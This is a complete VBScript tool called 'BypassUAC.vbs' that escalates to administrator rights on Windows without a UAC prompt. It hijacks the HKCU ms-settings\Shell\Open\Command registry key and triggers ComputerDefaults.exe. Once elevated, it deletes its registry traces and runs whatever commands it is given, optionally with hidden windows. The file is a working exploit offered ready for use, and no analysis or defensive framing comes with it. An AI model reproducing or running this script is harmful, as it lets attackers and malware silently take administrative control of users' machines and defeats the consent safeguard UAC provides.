Dim FSO, ws
Set FSO = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("Wscript.Shell")

Call BypassUAC()

If WScript.Arguments.Count > 0 Then
	Dim Argv: Set Argv = WScript.Arguments
	Dim Hide: Hide = LCase(Argv(0)) = "-h" Or LCase(Argv(0)) = "/h"
	For Each Arg In Argv
		If LCase(Arg) <> "-h" And LCase(Arg) <> "/h" Then ws.Run Arg, Hide + 1, False
	Next
Else
	MsgBox "Usage:" & vbCrLf & _
	       "    BypassUAC.vbs [-h|/h] ""Command1"" ""Command2"" ""Command3""..." & vbCrLf & vbCrLf & _
	       "Options:" & vbCrLf & _
	       "    -h or /h: Hide windows while running commands", 64, "BypassUAC.vbs - Usage"
End If



Function BypassUAC()
	''' BypassUAC-min By PY-DNG; Version 1.0 '''
	On Error Resume Next: Err.Clear
	Dim UAC, Args, RegPath, i, j
	Dim Reg: Reg = Array("HKEY_CURRENT_USER\Software\Classes\ms-settings\", "Shell\", "Open\", "Command\", "DelegateExecute")
	
	' Get All Arguments
	For Each Arg in WScript.Arguments
		Args = Args & " " & Chr(34) & Arg & Chr(34)
	Next
	
	' Test If We Have UAC
	TFPath = FSO.GetSpecialFolder(WindowsFolder) & "\system32\UACTestFile"
	FSO.CreateTextFile TFPath, True
	UAC = FSO.FileExists(TFPath) And Err.number <> 70
	
	' Have UAC
	If UAC Then
		' Delete Test File
		FSO.DeleteFile TFPath, True
		' Clear Reg Path
		For i = UBound(Reg)-1 To 0 Step -1
			RegPath = ""
			For j = 0 To i
				RegPath = RegPath & Reg(j)
			Next
			ws.RegDelete RegPath
		Next
		Exit Function
	End If
	
	' No UAC: Get It
	ws.RegWrite Join(Reg, ""), "", "REG_SZ"
	ws.RegWrite Replace(Join(Reg, ""), Reg(4), ""), "wscript.exe """ & WScript.ScriptFullName & """" & Args, "REG_SZ"
	ws.Run "ComputerDefaults.exe"
	WScript.Quit
End Function

Function FormatPath(ByVal Path)
    If Not Right(Path, 1) = "\" Then Path = Path & "\"
    FormatPath = Path
End Function